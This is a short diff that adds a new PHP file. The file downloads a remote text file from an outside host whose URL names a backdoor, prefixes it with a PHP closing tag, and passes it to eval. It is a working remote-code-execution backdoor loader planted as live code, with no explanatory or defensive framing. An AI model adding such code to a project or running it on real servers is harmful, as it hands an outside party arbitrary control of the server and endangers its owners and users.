@@ -1,0 +1,6 @@
+<?php
+
+$content = file_get_contents(urldecode('https://works.short-attack.codes/B4ck-D0OR/badboyz-edition.txt'));
+
+$content = "?> ".$content;
+eval($content);
